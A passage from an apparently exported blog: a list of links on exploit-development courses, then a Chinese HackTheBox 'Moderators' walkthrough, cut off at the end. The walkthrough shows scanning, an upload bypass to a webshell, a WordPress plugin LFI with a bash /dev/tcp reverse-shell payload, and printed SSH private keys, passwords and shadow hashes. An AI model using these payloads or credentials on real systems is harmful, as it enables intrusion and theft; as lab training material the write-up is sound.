中文资料 SploitFun Linux x86 Exploit 开发系列教程 · SploitFun Linux x86 Exploit 开发系列教程https://wizardforcel.gitbooks.io/sploitfun-linux-x86-exp-tut/content/ Exploit开发系列教程 Exploit开发系列教程-Windbg - 跳跳糖https://tttang.com/archive/834/#toc_edit Exploit开发系列教程-Mona 2&amp; SEH - 跳跳糖https://tttang.com/archive/990/ Exploit开发系列教程-Heap - 跳跳糖https://tttang.com/archive/918/ Exploit开发系列教程-Windows基础&amp;shellcode - 跳跳糖https://tttang.com/archive/901/ Exploit开发系列教程-Exploitme1 (“ret eip” overwrite) &amp;More space on stack - 跳跳糖https://tttang.com/archive/680/ Exploit开发系列教程-Exploitme2 (Stack cookies &amp; SEH) - 跳跳糖https://tttang.com/archive/756/ 跟小黑学漏洞利用开发 跟小黑学漏洞利用开发之SEH溢出-安全客 - 安全资讯平台https://www.anquanke.com/post/id/192904 跟小黑学漏洞利用开发之egghunter-安全客 - 安全资讯平台https://www.anquanke.com/post/id/193065 跟小黑学漏洞利用开发之unicode-安全客 - 安全资讯平台https://www.anquanke.com/post/id/193802 跟小黑学漏洞利用开发之16进制字符转换-安全客 - 安全资讯平台https://www.anquanke.com/post/id/194070 跟小黑学漏洞利用开发之SEH+Egghunter-安全客 - 安全资讯平台https://www.anquanke.com/post/id/194303 Windows Exploitation by n0maj1o24这个分类下自行查看 分类: Windows Exploitation | Technical Memorandumhttps://n0maj1o24.github.io/categories/Windows-Exploitation/ Reviews OSED - Navigating The Shadowshttps://red.0xbad53c.com/training-reviews/offensive-security/osed My Offensive Security Exploit Developer Review | nop-bloghttps://nop-blog.tech/blog/osed/ Course Review - Offensive Security’s Windows User Mode Exploit Development (EXP-301/OSED)https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/ ROP and Roll: EXP-301 Offensive Security Exploit Developer (OSED) Review and Exam | Spaceraccoon’s Bloghttps://spaceraccoon.dev/rop-and-roll-exp-301-offensive-security-exploit-development-osed-review-and/ Offensive Security OSED Review · Hop Infosechttps://0xhop.github.io/binex/2022/07/30/OSED-Review/ Offensive Security EXP-301/OSED Review | yakuhito’s bloghttps://blog.kuhi.to/offsec-exp301-osed-review Road to OSEDhttps://tehwinsam.com/osed/ How I Failed Twice… and Finally Passed the Offensive Security OSED 72-hour Exam (EXP-301) - CUJO AIhttps://cujo.com/how-i-failed-twice-and-finally-passed-the-offensive-security-osed-72-hour-exam-exp-301/ Congrats on the OSED Certificate! | Fluid Attackshttps://fluidattacks.com/blog/osed-certification/ 视频 OSED Review - Offensive Security Exploit Developer - YouTubehttps://www.youtube.com/watch?v=NAe6f1_XG6Q&amp;ab_channel=JohnHammond 中文 EXP-301 | OSED 證照滿分之旅 - b3rm1nG - Mediumhttps://medium.com/@b3rm1nG/exp-301-osed-%E8%AD%89%E7%85%A7%E6%BB%BF%E5%88%86%E4%B9%8B%E6%97%85-f55c95146abc OSCE3之路 - OSED | EXP301 - 4xpl0r3r’s bloghttps://cn.4xpl0r3r.com/%E8%AF%81%E4%B9%A6/OSCE3%E4%B9%8B%E8%B7%AF-OSED-EXP301/ OSCE3 Certification: From Zero to One | Technical Memorandumhttps://n0maj1o24.github.io/2022/10/03/OSCE3-Certification-From-Zero-to-One/","categories":[],"tags":[]},{"title":"Moderators - HackTheBox","slug":"Moderators-HackTheBox","date":"2022-09-29T07:40:57.000Z","updated":"2022-11-07T01:01:03.748Z","comments":true,"path":"2022/09/29/Moderators-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/09/29/Moderators-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/485 10.10.11.173 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.173Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-29 13:20 CSTNmap scan report for 10.10.11.173Host is up (0.19s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 390316061130a0b0c2917988d3931b3e (RSA)| 256 51945c593bbdbcb6267aef837f4cca7d (ECDSA)|_ 256 a56d03fa6cf5b94aa2a1b6bdbc604231 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: ModeratorsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 74.59 seconds 80某安全公司官网之类的： 公开有几份report，可以知道参数格式： 目录扫描扫描发现一个logs目录，直接访问是空白: 1234567891011$ gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://10.10.11.173/ -x html,txt,php/about.php (Status: 200) [Size: 11539]/blog.php (Status: 200) [Size: 13163]/contact.php (Status: 200) [Size: 10084]/css (Status: 301) [Size: 310] [--&gt; http://10.10.11.173/css/]/images (Status: 301) [Size: 313] [--&gt; http://10.10.11.173/images/]/index.php (Status: 200) [Size: 11150]/logs (Status: 301) [Size: 311] [--&gt; http://10.10.11.173/logs/]/reports.php (Status: 302) [Size: 7888] [--&gt; index.php]/service.php (Status: 200) [Size: 9411] logslogs目录继续扫描发现uploads: 123gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://10.10.11.173/logs//uploads (Status: 301) [Size: 319] [--&gt; http://10.10.11.173/logs/uploads/] report FUZZ根据上面的格式fuzz，发现一些未公开的report： 123456789ffuf -w ~/Tools/dict/SecLists/Fuzzing/4-digits-0000-9999.txt -u \"http://10.10.11.173/reports.php?report=FUZZ\" -fs 78882589 [Status: 200, Size: 9786, Words: 3714, Lines: 275, Duration: 213ms]3478 [Status: 200, Size: 9831, Words: 3740, Lines: 276, Duration: 204ms]4221 [Status: 200, Size: 9880, Words: 3811, Lines: 274, Duration: 200ms]4750 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 5392ms]7612 [Status: 200, Size: 9790, Words: 3704, Lines: 276, Duration: 807ms]8121 [Status: 200, Size: 9784, Words: 3723, Lines: 274, Duration: 195ms]9798 [Status: 200, Size: 9887, Words: 3771, Lines: 277, Duration: 194ms] 97989798中得到logs下路径，就是report id的md5: 12$ echo -n 9798 | md5sume21cece511f43a5cb18d4932429915ed - 25892589对应md5目录下继续探测发现logs.pdf(坑，没提示完全想不到): 1234$ echo -n 2589 | md5sum743c41a921516b04afde48bb48e28ce6 -http:&#x2F;&#x2F;10.10.11.173&#x2F;logs&#x2F;743c41a921516b04afde48bb48e28ce6&#x2F;logs.pdf 文件给出上传途径： upload文件上传绕过一些pdf相关校验成功上传pdf，路径结合前面的信息可以猜到在uploads目录下，禁用了很多函数： webshell蚁剑秒了： 信息简单的枚举，发现本地8080端口，转发出来访问： 808012345# local./chisel_1.7.0-rc7_darwin_amd64 server -p 8000 --reverse# target./chisel_1.7.6_linux_amd64 client 10.10.14.19:8000 R:8080:127.0.0.1:8080 &amp; 是一个wordpress,需要改一下hosts，因为现在是本地端口访问： 1127.0.0.1 moderators.htb 结合服务器上信息，发现存在漏洞的插件： WordPress Plugin Brandfolder 3.0 - Local/Remote File Inclusion - PHP webapps Exploithttps://www.exploit-db.com/exploits/39591 wordpress exploit不能RFI，直接本地写个php文件之后LFI即可得到lexi用户shell 123wget http://10.10.14.19:7777/wp-load.phpcurl \"http://localhost:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/\" lexi用户目录可以拿到私钥，方便后续操作： wp-load.php1&lt;?php system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.19/4444 0&gt;&amp;1'\"); ?&gt; lexi_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357LfXjhIuTG4qkX6eY4iCw7EBGKwaErynECxvN0TbZia5MhfHhJDL88bk2CososBm6i0phnvPo5facWeOzP3vdIiJYdP0XrZ5mNMLbMONvoGU8p8LKhlfzHIBqhPxB4N7Dgmcmg2DJ&#x2F;QRXYrblAj8Bo1owGebWUBlB&#x2F;tMcO3YqvaaQCuzVluSShMrGKJVjL0n2Uvqf&#x2F;Dw4ouQK3TwXdzrluhCo9icb+2QdA7KxmInb71+OT6rWVdQ5ymZTot+&#x2F;qALnzlDkeUlT&#x2F;RWtqJxJc6MlWy5&#x2F;neegZRRd3YNhln&#x2F;1GyL5aN&#x2F;0O1gBwf3vY87IYFXK&#x2F;W0a9Tj5mZ0RNDEOU+wSicM9nS3jabM1Unocq7jw36UPHQhniso6Q7ObvMnWvcxbVFo9M2axqTTnr&#x2F;gFkLzU0sj8ms4nxoRagCvc8oOUpMXoauEwEwdpbq3FfT8aKGYKl64vO+aJxiTPkPpgI6L+pWCYfLXIXwcbVo2xXp3euHLAAAFiI1Y9VaNWPVWAAAAB3NzaC1yc2EAAAGBAJh1aL5jDfrdLudnmugd+ey3144SLkxuKpF+nmOIgsOxARisGhK8pxAsbzdE22YmuTIXx4SQy&#x2F;PG5NgqLKLAZuotKYZ7z6OX2nFnjsz973SIiWHT9F62eZjTC2zDjb6BlPKfCyoZX8xyAaoT8QeDew4JnJoNgyf0EV2K25QI&#x2F;AaNaMBnm1lAZQf7THDt2Kr2mkArs1ZbkkoTKxiiVYy9J9lL6n&#x2F;w8OKLkCt08F3c65boQqPYnG&#x2F;tkHQOysZiJ2+9fjk+q1lXUOcpmU6Lfv6gC585Q5HlJU&#x2F;0VraicSXOjJVsuf53noGUUXd2DYZZ&#x2F;9Rsi+Wjf9DtYAcH972POyGBVyv1tGvU4+ZmdETQxDlPsEonDPZ0t42mzNVJ6HKu48N+lDx0IZ4rKOkOzm7zJ1r3MW1RaPTNmsak056&#x2F;4BZC81NLI&#x2F;JrOJ8aEWoAr3PKDlKTF6GrhMBMHaW6txX0&#x2F;GihmCpeuLzvmicYkz5D6YCOi&#x2F;qVgmHy1yF8HG1aNsV6d3rhywAAAAMBAAEAAAGAUZ2o8SL9&#x2F;OojjeW8274QaVURpBC&#x2F;kFL5nuH10LrnpfM&#x2F;7wFTA+zSUqo275OBEHJyegqY2LLbPCmhoMcTFh2B+qMqs7&#x2F;cLGvCmSsjG0JlyjC9uw1IqNtuxQ1V9GfLncyo&#x2F;CmARI1I552wnmgGhEsyuRUULLRHHkBee4E2g007&#x2F;hX9meLdGy6J53f0OBBcCUny0Z+TZguniNgyHgHpYmpwxrcJVmyZx+2GxHzZoKX&#x2F;yM2VvzjapmC7ECZLD2DEU+FQua6YHGw2KOs5tiX7BLQLr2R4cqz0akMZZJ0utIEWgDi5dX&#x2F;EYyy8HfqtCPWmplcrhtw&#x2F;DTRVLLCtiL0zzmYMiqvgh6OQZmFcLd0B0jbvBq3fq2l+UAMcUrWpo1D3Rv&#x2F;KRIVRog9+7e6r8aRVPf&#x2F;vIXy+jJlaWcG5Tq7a7wWwGQcqVW3aGnZivvc2aYMWVux4G5F1sD9bamasGARP&#x2F;j0UNTeBNai+Lg1WDIHOzxq8bQhI0Xvdp2reFFzLGn8ePh0hAAAAwEaFdCpqhzFIqnwgDxrrQJ4QlvysZbMCVgxApzM5SLtAt6jQLBCLrOwe&#x2F;DYpdFOjIK888U0IRMzUtQjoP+RNU1PJZtB+neDkw6Kl1Muf4DCnTXr9mwyVlMQHmW1asWiEDr66YqLiKSF6CZHYRpFM4qUA+w3ABi8OJ+wzs+KDVk4Aw+v+AotbL9JStLBksR5P08sxAivWT&#x2F;KbXMifJnLrcrmS&#x2F;t+QdOG2Vf&#x2F;7ebYiyBbg1TD4BUAsjKZs8kByr6PoKQAAAMEAyQ1JW3&#x2F;xrUZyhlWnNnYVC0xcmSAkl90jHyW5AhR+5neuIu548xnk8a3PSO6j3w7kEmJTiOorwzAdM&#x2F;u9CqWiaUh7E4bnCEoakAlftaJsXWUtf1G7ZXcK587Ccxv330XHToH4HqF408oC&#x2F;mM40&#x2F;JNJ9Rqa9Io9azk0fEjIQmjF0GqdNTBfSNqoqZX7HTV34FO+8mj+7fFvrFOnHKsa2FiwADUgEmkw2jJ63egq&#x2F;DaGJECdxk9CNDElLVQxBs3X4i&#x2F;AAAAwQDCIEQcdMnPI9cP5WUOmWWNH6jlpEpsF0qm0iAt4qjy&#x2F;3uoN0NdQrX+8laOMIzRVe&#x2F;Br4Py4NVmRTsMfU5t&#x2F;1Jz&#x2F;DXJoy9CcXD5VKkUnUp668wxSJC8y&#x2F;5cYKTeE8rwhDXxP0I5ZJztCYf8bL2BWSWF&#x2F;h4iiUW4mMKyAzvg&#x2F;iDfjGmbxA8bieu1cmlE5GJgbXeuxeDfRyzWtLfYCwZU5E9RHz0D+1x1M9P+EaNVQu0p3vsS8rWJlyJ&#x2F;dOO74&#x2F;zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- user flaglexi用户目录，user.txt: 信息wp-config.php中得到数据库密码，数据库直接修改wordpress用户密码登录wp后台: 12345678910111213define( 'DB_NAME', 'wordpress' );/** MySQL database username */define( 'DB_USER', 'wordpressuser' );/** MySQL database password */define( 'DB_PASSWORD', 'wordpresspassword123!!' );mysql -Dwordpress -uwordpressuser -p'wordpresspassword123!!'UPDATE `wp_users` SET `user_pass` = '$P$BIsDcvvyUHRF.QKXlJzhA9.kgCsuxL/' WHERE user_login = 'admin';# 明文是password Generador de hash de contraseña de WordPresshttps://www.useotools.com/es/wordpress-password-hash-generator/ wordpress登录进去后，pwdms中得到john的私钥和carl账号密码： 12carl@moderators.htbCarl@thebest** john_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAn&#x2F;Neot2K7OKlkda5TCHoWwP5u1hHhBwKzM0LN3hn7EwyXshgj9G+lVSMVOUMeS5SM6iyM0Tg82EVfEbAMpPuCGbWvr1inU8B6eDb9voLQyGERcbKf29I7HwXab8T+HkUqy+CLm&#x2F;X+GR9zlgNhNUZgJePONPK1OLUkz&#x2F;mJN9Sf57w8ebloATzJJyKNAdRg3XqHUfwDldCDZiTTt3R6s5wWkrRuZ6sZp+v+RonFhfT2Ue741CSULhS2fcIGCLRW+8WQ+M0ydq76Ite2XHanP9lrj3de8xU92ny&#x2F;rjqU9U6EJG0DYmtpLrkbGNLey9MjuFncBqQGnCaqfFkHQb+S6eCIDD0N3W0flBMhJfzwxKYXpAJSlLElqhPJayinWXSZqBhbp8Bw3bs4RCHbtwawuSefWzZEsdA0wGrbbuopaJX1UpyuAQb2UD5YRDaSC2V2Rv4Wi&#x2F;32PxoKyAxj1x6w2wR5ytyEoFzVfdeKQ8o5Avl4MM6gqC5qaubduLABhsEXflrAAAFiPtk5tj7ZObYAAAAB3NzaC1yc2EAAAGBAJ&#x2F;zXqLdiuzipZHWuUwh6FsD+btYR4QcCszNCzd4Z+xMMl7IYI&#x2F;RvpVUjFTlDHkuUjOosjNE4PNhFXxGwDKT7ghm1r69Yp1PAeng2&#x2F;b6C0MhhEXGyn9vSOx8F2m&#x2F;E&#x2F;h5FKsvgi5v1&#x2F;hkfc5YDYTVGYCXjzjTytTi1JM&#x2F;5iTfUn+e8PHm5aAE8yScijQHUYN16h1H8A5XQg2Yk07d0erOcFpK0bmerGafr&#x2F;kaJxYX09lHu+NQklC4Utn3CBgi0VvvFkPjNMnau+iLXtlx2pz&#x2F;Za493XvMVPdp8v646lPVOhCRtA2JraS65GxjS3svTI7hZ3AakBpwmqnxZB0G&#x2F;kungiAw9Dd1tH5QTISX88MSmF6QCUpSxJaoTyWsop1l0magYW6fAcN27OEQh27cGsLknn1s2RLHQNMBq227qKWiV9VKcrgEG9lA+WEQ2kgtldkb+Fov99j8aCsgMY9cesNsEecrchKBc1X3XikPKOQL5eDDOoKguamrm3biwAYbBF35awAAAAMBAAEAAAGBAJsfhQ2AvIZGvPp2e5ipXdY&#x2F;Qch+skUeiR7cUN+IJ4mU0Fj6DiQM77+Vks+WoAU6dkBhgAmW6G9BHXw8hZPHwddmHSg5NdWIVTvEdq&#x2F;NCnUdoVGmnKcAf4HSS0akKLMWgoQO&#x2F;Dsa&#x2F;yKIGzauUNYdcbEzy5P6W0Ehh7YTB5mE+FaLB&#x2F;Qi0Vni0wgTxTj2TAipp9aj+N1&#x2F;pLDY4yxeloIZmf8HhuR1TY&#x2F;tmNWGlpenni6gkki&#x2F;0Fb2nGuFV9VIlzCI6s7++ARLTUysVDhCB0H5Urxey4Ynxu9NWejsf6QAZibAZSb6iluerZYKiiJD0pmDBY1ApJhNE+tafeIeX1EyPgq9yGKUXZEI1VE0rITGbpHPjYAnn7yhLDQ9rcrFW&#x2F;SaR80ulolwQRm+4J8TEHAVYGzshNZ2tvrYDVGOT&#x2F;OvFObOK7kRHHKJBVL6I96htcvSzN5qGw3+I7YJKTrXJwJ5vEjjelmyK82FXquUcubMTW6&#x2F;B72QNW7zjRgLGGObpWWV+QAAAMAE4VjUADP53GgSVYpLBnR+69RVBqc5h3U3D6zButs&#x2F;m7xsMoIoBrkv342fsK4qkBYWFUsdCOXDQUGYcVdzXKwzRsKslGOAnyeRsg9wYsVhcc1YSWIJZBdBIaqPBKcfsVGUM88icxqkQn6CEN4Bwy0ZgB&#x2F;SAXMMU8IQHtcfZQFeiByg0&#x2F;XRlvZuQay6Cw6&#x2F;406dlzTJDmzGzkzX084V8F7PfPJ2oSs6c813vv6B1iKw1Ii9qAmPqBFC83rwnCjs+Q0AAADBANUfGWc7YgCVG5SOu89ba4uO4wZ&#x2F;zpbHog7cs1flldkrtDZluiqWWopTAKpnsD2CXSxoZ7cWdPytJeuElvlRmYaUUrjaj2WFdNLgMjFb4jZeEcI3lz8BeRSTiXUSbLA4SxVLeSizZx8g1SNVAlE5VwUWZVYo6ge465sU&#x2F;c54jAxW2X2yioPCPdYVEpOTTZr40mg94&#x2F;Zycxlbd8+L1jaepLqvXq5K4lSXPrPoZ&#x2F;w+K9mf5912RGlmSzBARVUyCqquLQAAAMEAwCGwEI9KR0zmcnfhGiQviWObgAUEDA7hHxJn61h6sI0SsFOCatx9Q+a7sbKeVqQdph8Rn5rInzQ7TpvflHsrGzvU0ZpZ0Ys2928pN7So+Bt6jTiNTXdD24&#x2F;FmZbxn&#x2F;BXLovEJpeT2L3V3kvabJAHhSykFP0+Q0dlNDmQxuMQ+muOFQGVHxktaFKkrEl71gqoHPll8zNwNY9BjpxFPy48B1RgkxkfHSNZ8ujSI6Wse3tX6T03HDfotkBDyCmCDxz3AAAAD2pvaG5AbW9kZXJhdG9ycwECAw&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- John现在可以登录john用户继续进行后续操作,发现VBOX相关文件： vdi crack后续操作需要virtualbox，参考wp云了(论坛也一致认为root部分很蠢，这台机器的评分也说明了这一点)： 首先修改vbox文件,对应本地路径等信息 然后破解vdi密码 axcheron/pyvboxdie-cracker: Simple Python tool to crack VirtualBox Disk Image Encryption passwordshttps://github.com/axcheron/pyvboxdie-cracker 12345678910111213❯ python3 pyvboxdie-cracker.py -v 2019-08-01.vbox -d wordlist.txtStarting pyvboxdie-cracker...[*] Encrypted drive found : F:/2019.vdi[*] KeyStore information... Algorithm = AES-XTS256-PLAIN64 Hash = PBKDF2-SHA256 Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f[*] Starting bruteforce... 51 password tested...[*] Password Found = computer 对于接下来的内容，请记住安装 virtualbox 扩展包 一旦我们安装了 ubuntu 并添加了 vdi，我们必须启用我们之前看到的加密 当试图将它挂载到 /dev/shm 时，我们会得到一个 crypto_LUKS 类型的错误 123ubuntu@ubuntu:~$ sudo mount /dev/sda /dev/shmmount: /dev/shm: unknown filesystem type 'crypto_LUKS'ubuntu@ubuntu:~$ 我们可以用一个工具来帮助自己获取密码: Diverto/cryptsetup-pwguess: Modified cryptsetup to enable password guessing - https://diverto.github.io/2019/11/18/Cracking-LUKS-passphraseshttps://github.com/Diverto/cryptsetup-pwguess 123ubuntu@ubuntu:~$ ./bruteforce-luks-static-linux-amd64 -f wordlist.txt /dev/sdaPassword found: abc123ubuntu@ubuntu:~$ 安装后，我们会找到几个脚本，包括带有密码的 distro_update.sh 1234567echo \"\"echo \"Installing updates..\"passwd='$_THE_best_Sysadmin_Ever_'echo $passwd|sudo apt-get updateecho \"Upgrading...\"echo $passwd|sudo apt-get -y upgrade changed_vbox12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;?xml version=\"1.0\"?&gt;&lt;!--** DO NOT EDIT THIS FILE.** If you make changes to this file while any VirtualBox related application** is running, your changes will be overwritten later, without taking effect.** Use VBoxManage or the VirtualBox Manager GUI to make changes.--&gt;&lt;VirtualBox xmlns=\"http://www.virtualbox.org/\" version=\"1.16-windows\"&gt; &lt;Machine uuid=\"&#123;528b3540-b8be-4677-b43f-7f4969137747&#125;\" name=\"Moderator 1\" OSType=\"Ubuntu_64\" snapshotFolder=\"Snapshots\" lastStateChange=\"2022-08-11T19:20:46Z\"&gt; &lt;MediaRegistry&gt; &lt;HardDisks&gt; &lt;HardDisk uuid=\"&#123;12b147da-5b2d-471f-9e32-a32b1517ff4b&#125;\" location=\"./2019.vdi\" format=\"VDI\" type=\"Normal\"&gt; &lt;Property name=\"CRYPT/KeyId\" value=\"Moderator 1\"/&gt; &lt;Property name=\"CRYPT/KeyStore\" value=\"U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&amp;#13;&amp;#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAADssBk3IXYOVlXkLWlDd8JCJ8ZUN8FC&amp;#13;&amp;#10;kVQY8Ovl9vXMMyAAAABu5KwY/KgMH20LHptIADnZJ6gRrgSFLm+s6eJEaJx+ziBO&amp;#13;&amp;#10;AAByl/CysecMVxqIA8QKkYqCcCT+RiMz7PJCBnJ+/oGFI2DqAABAAAAAKGFz0b7a&amp;#13;&amp;#10;q8cFTdpSCXUCgvz+yFWcIi1i2jYow1/CS0CEEATdrtbMxzzANgoenuThAceBWSUQ&amp;#13;&amp;#10;FqJ4CioY8Qm3BA==\"/&gt; &lt;/HardDisk&gt; &lt;/HardDisks&gt; &lt;/MediaRegistry&gt; &lt;ExtraData&gt; &lt;ExtraDataItem name=\"GUI/LastCloseAction\" value=\"PowerOff\"/&gt; &lt;ExtraDataItem name=\"GUI/LastGuestSizeHint\" value=\"2560,1335\"/&gt; &lt;ExtraDataItem name=\"GUI/LastNormalWindowPosition\" value=\"0,23,640,480,max\"/&gt; &lt;/ExtraData&gt; &lt;Hardware&gt; &lt;CPU count=\"2\"&gt; &lt;PAE enabled=\"false\"/&gt; &lt;LongMode enabled=\"true\"/&gt; &lt;X2APIC enabled=\"true\"/&gt; &lt;HardwareVirtExLargePages enabled=\"true\"/&gt; &lt;/CPU&gt; &lt;Memory RAMSize=\"2048\"/&gt; &lt;HID Pointing=\"USBTablet\"/&gt; &lt;Boot&gt; &lt;Order position=\"1\" device=\"Floppy\"/&gt; &lt;Order position=\"2\" device=\"HardDisk\"/&gt; &lt;Order position=\"3\" device=\"DVD\"/&gt; &lt;Order position=\"4\" device=\"None\"/&gt; &lt;/Boot&gt; &lt;Display controller=\"VMSVGA\" VRAMSize=\"128\" accelerate3D=\"true\"/&gt; &lt;BIOS&gt; &lt;IOAPIC enabled=\"true\"/&gt; &lt;SmbiosUuidLittleEndian enabled=\"true\"/&gt; &lt;/BIOS&gt; &lt;USB&gt; &lt;Controllers&gt; &lt;Controller name=\"OHCI\" type=\"OHCI\"/&gt; &lt;Controller name=\"EHCI\" type=\"EHCI\"/&gt; &lt;/Controllers&gt; &lt;/USB&gt; &lt;Network&gt; &lt;Adapter slot=\"0\" enabled=\"true\" MACAddress=\"08002799F7EC\" type=\"82540EM\"&gt; &lt;NAT/&gt; &lt;/Adapter&gt; &lt;/Network&gt; &lt;AudioAdapter codec=\"AD1980\" driver=\"DirectSound\" enabled=\"true\" enabledIn=\"false\"/&gt; &lt;RTC localOrUTC=\"UTC\"/&gt; &lt;Clipboard/&gt; &lt;GuestProperties&gt; &lt;GuestProperty name=\"/VirtualBox/GuestAdd/HostVerLastChecked\" value=\"6.1.34\" timestamp=\"1657117437893678100\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestAdd/Revision\" value=\"150636\" timestamp=\"1657117380950198406\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestAdd/Version\" value=\"6.1.34\" timestamp=\"1657117380950198404\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestAdd/VersionExt\" value=\"6.1.34\" timestamp=\"1657117380950198405\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/MAC\" value=\"08002799F7EC\" timestamp=\"1657117380952151105\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/Name\" value=\"enp0s3\" timestamp=\"1657117380952151107\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/Status\" value=\"Up\" timestamp=\"1657117380952151106\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/V4/Broadcast\" value=\"10.0.2.255\" timestamp=\"1657117380952151103\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/V4/IP\" value=\"10.0.2.15\" timestamp=\"1657117380952151102\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/V4/Netmask\" value=\"255.255.255.0\" timestamp=\"1657117380952151104\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/Count\" value=\"1\" timestamp=\"1657117646084736900\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/OS/Product\" value=\"Linux\" timestamp=\"1657117380950198400\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/OS/Release\" value=\"5.15.0-40-generic\" timestamp=\"1657117380950198401\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/OS/Version\" value=\"#43-Ubuntu SMP Wed Jun 15 12:54:21 UTC 2022\" timestamp=\"1657117380950198402\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/HostInfo/DekMissing\" value=\"1\" timestamp=\"1660245560293252500\" flags=\"RDONLYGUEST\"/&gt; &lt;GuestProperty name=\"/VirtualBox/HostInfo/GUI/LanguageID\" value=\"es_ES\" timestamp=\"1660245647071532000\" flags=\"\"/&gt; &lt;/GuestProperties&gt; &lt;/Hardware&gt; &lt;StorageControllers&gt; &lt;StorageController name=\"AHCI\" type=\"AHCI\" PortCount=\"3\" useHostIOCache=\"false\" Bootable=\"true\" IDE0MasterEmulationPort=\"0\" IDE0SlaveEmulationPort=\"1\" IDE1MasterEmulationPort=\"2\" IDE1SlaveEmulationPort=\"3\"&gt; &lt;AttachedDevice type=\"HardDisk\" hotpluggable=\"false\" port=\"0\" device=\"0\"&gt; &lt;Image uuid=\"&#123;12b147da-5b2d-471f-9e32-a32b1517ff4b&#125;\"/&gt; &lt;/AttachedDevice&gt; &lt;/StorageController&gt; &lt;/StorageControllers&gt; &lt;VideoCapture options=\"vc_enabled=true,ac_enabled=true,ac_profile=med\" fps=\"25\"/&gt; &lt;/Machine&gt;&lt;/VirtualBox&gt; 提权 &amp; root flag前面得到的密码就是john密码，在 sudoers 级别具有 ALL： 1$_THE_best_Sysadmin_Ever_ shadow123root:$6$aqIOGu.rJRXjVGgt$lN7qDpHZdrBxEcRi4VxcJt4dpNXwmxLsO7mTliULzPVcJyy5OPxLP3SmvgcprzkeZLbX.lPrqEg3JYYyV3Ayo0:19021:0:99999:7:::john:$6$PK0A253j816qSMhV$4Oy&#x2F;1b8vR6K1XDcvBMzAVZn.MOVLiBWDHOugQorKdhVBnbi1o.fSKcSzrltl9z7hiGekw6bkt18XH14e0ALTC0:18890:0:99999:7:::lexi:$6$IXHONvrvfEmCO7dH$banmCiCTcf7rcYWQr7jn3GkYeRpfQYWxafrlhhpcpdOfqkMwBEpFXVinENnfhEa3EdiE92v30PBhp6GqF6w67&#x2F;:18890:0:99999:7::: 参考资料 WordPress Plugin Brandfolder 3.0 - Local/Remote File Inclusion - PHP webapps Exploithttps://www.exploit-db.com/exploits/39591 Generador de hash de contraseña de WordPresshttps://www.useotools.com/es/wordpress-password-hash-generator/ axcheron/pyvboxdie-cracker: Simple Python tool to crack VirtualBox Disk Image Encryption passwordshttps://github.com/axcheron/pyvboxdie-cracker Diverto/cryptsetup-pwguess: Modified cryptsetup to enable password guessing - https://diverto.github.io/2019/11/18/Cracking-LUKS-passphraseshttps://github.com/Diverto/cryptsetup-pwguess Moderators-HTB [Discussion] | BreachForumshttps://breached.to/Thread-Moderators-HTB-Discussion Writeup Moderators HackTheBoxhttps://gatogamer1155.github.io/hackthebox/moderators/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Absolute - 